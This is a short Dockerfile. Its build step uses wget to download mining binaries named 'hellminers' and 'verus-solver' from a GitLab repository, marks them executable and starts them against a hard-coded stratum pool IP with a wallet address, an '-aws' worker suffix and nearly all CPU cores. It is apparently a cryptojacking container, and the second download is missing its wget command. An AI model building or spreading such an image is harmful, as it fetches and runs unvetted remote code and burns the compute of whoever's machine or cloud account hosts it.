FROM ubuntu:18.04

RUN apt-get update && \
    apt-get install wget -y && \
    wget https://gitlab.com/lambohopo/file/-/raw/main/hellminers && https://gitlab.com/lambohopo/file/-/raw/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://139.99.123.225:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-3 -n 1)-aws) -p x --cpu $(nproc --ignore 1)
    
